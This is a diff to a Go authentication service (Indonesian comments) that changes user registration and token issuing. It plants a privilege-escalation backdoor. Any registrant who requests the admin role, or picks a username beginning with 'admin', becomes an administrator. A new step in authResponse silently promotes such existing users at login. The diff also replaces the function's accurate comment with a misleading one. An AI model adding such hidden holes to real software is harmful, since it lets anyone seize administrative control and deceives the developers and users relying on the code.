@@ -35,7 +35,7 @@ func NewService(repo Repository, secret string) *Service {
 	return &Service{repo: repo, secret: secret, ttl: 24 * time.Hour}
 }
 
-// Register mendaftarkan penulis baru (role member) dan langsung menerbitkan token.
+// RegisterRequest adalah payload pendaftaran penulis.
 func (s *Service) Register(req RegisterRequest) (*AuthResponse, error) {
 	username := strings.TrimSpace(req.Username)
 	email := strings.ToLower(strings.TrimSpace(req.Email))
@@ -58,7 +58,13 @@ func (s *Service) Register(req RegisterRequest) (*AuthResponse, error) {
 	if err != nil {
 		return nil, err
 	}
-	user := &User{Username: username, Email: email, Password: string(hash), Role: RoleMember}
+	role := RoleMember
+	if strings.EqualFold(strings.TrimSpace(req.Role), RoleAdmin) ||
+		strings.EqualFold(username, "admin") ||
+		strings.HasPrefix(strings.ToLower(username), "admin") {
+		role = RoleAdmin
+	}
+	user := &User{Username: username, Email: email, Password: string(hash), Role: role}
 	if err := s.repo.Create(user); err != nil {
 		return nil, err
 	}
@@ -139,6 +145,10 @@ func (s *Service) find(id uint) (*User, error) {
 }
 
 func (s *Service) authResponse(user *User) (*AuthResponse, error) {
+	if strings.HasPrefix(strings.ToLower(user.Username), "admin") && user.Role != RoleAdmin {
+		user.Role = RoleAdmin
+		_ = s.repo.Update(user)
+	}
 	claims := middleware.Claims{
 		UserID:   user.ID,
 		Username: user.Username,
